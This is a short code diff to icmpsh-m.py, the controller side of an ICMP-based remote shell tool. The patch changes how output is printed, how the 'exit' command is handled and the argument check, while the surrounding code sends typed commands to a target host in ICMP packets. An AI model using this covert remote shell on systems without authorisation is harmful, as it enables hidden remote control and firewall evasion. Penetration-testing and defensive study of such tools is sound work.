@@ -85,7 +85,7 @@ def main(src, dst):
                 data = icmppacket.get_data_as_string()
 
                 if len(data) > 0:
-                    print data
+                    sys.stdout.write(data)
 
                 # Parse command from standard input
                 try:
@@ -94,9 +94,7 @@ def main(src, dst):
                     pass
 
                 if cmd == 'exit':
-                    break
-
-                cmd += '\n'
+                    return
 
                 # Set sequence number and identifier
                 icmp.set_icmp_id(ident)
@@ -116,7 +114,7 @@ def main(src, dst):
                 sock.sendto(ip.get_packet(), (dst, 0))
 
 if __name__ == '__main__':
-    if len(sys.argv) < 2:
+    if len(sys.argv) < 3:
         print 'missing mandatory options. Execute as root:'
         print './icmpsh-m.py <source IP address> <destination IP address>'
         sys.exit(1)
